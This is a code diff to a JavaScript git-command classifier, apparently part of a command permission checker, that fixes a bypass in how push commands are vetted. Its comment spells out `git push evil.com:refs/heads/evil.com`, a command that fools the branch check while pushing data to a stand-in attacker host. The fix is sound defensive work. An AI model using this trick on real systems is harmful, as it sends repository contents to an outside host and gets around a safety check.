@@ -2513,7 +2513,20 @@ function classifyPlainGitChainSegment(segment) {
   if (/^git\s+add\b/i.test(trimmed)) return { kind: 'add' };
   if (/^git\s+commit\b/i.test(trimmed)) return { kind: 'commit' };
   const m = trimmed.match(PLAIN_PUSH_SEGMENT_RE);
-  if (m) return { kind: 'push', remote: m[2] || null, ref: m[3] || null };
+  if (m) {
+    // A1-6: with NO explicit remote token, git parses the sole positional
+    // argument as the <repository> (remote), not a refspec — real git syntax
+    // is `git push [<repository> [<refspec>...]]`, so a lone `SRC:DST`-shaped
+    // token is only ever a refspec when an explicit remote token precedes it.
+    // A colon-bearing token with no remote group is a scp-like remote URL
+    // (`host:path`) to git, however ref-shaped it looks (e.g. a branch named
+    // to look like a host: `git push evil.com:refs/heads/evil.com` passes
+    // isPlainPushRefAllowed's SRC===DST===<current branch> check while git
+    // itself pushes over ssh to host `evil.com`). Reject the segment outright
+    // rather than let isPlainPushRefAllowed's ref-shaped check vouch for it.
+    if (m[3] && m[3].indexOf(':') !== -1 && !m[2]) return null;
+    return { kind: 'push', remote: m[2] || null, ref: m[3] || null };
+  }
   if (PLAIN_LOG_SEGMENT_RE.test(trimmed)) return { kind: 'log' };
   if (PLAIN_STATUS_SEGMENT_RE.test(trimmed)) return { kind: 'status' };
   if (PLAIN_SHOW_SEGMENT_RE.test(trimmed)) return { kind: 'show' };
